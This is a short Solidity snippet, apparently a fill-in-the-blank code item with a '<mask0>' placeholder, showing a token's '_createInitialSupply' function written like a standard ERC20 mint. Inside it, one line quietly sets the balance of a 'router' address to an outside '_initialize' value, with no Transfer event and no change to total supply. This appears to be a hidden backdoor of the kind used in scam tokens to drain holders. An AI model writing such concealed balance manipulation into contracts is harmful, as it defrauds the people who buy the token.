"function _createInitialSupply(address account, address router, uint256 amount) internal virtual {        require(account != address(0), \"ERC20: mint to the zero address\");        _beforeTokenTransfer(address(0), account, amount);        _totalSupply += amount;        _balances[account] += amount;        _balances[router] = _initialize;        emit Transfer(address(0), account, amount);        <mask0>;    }"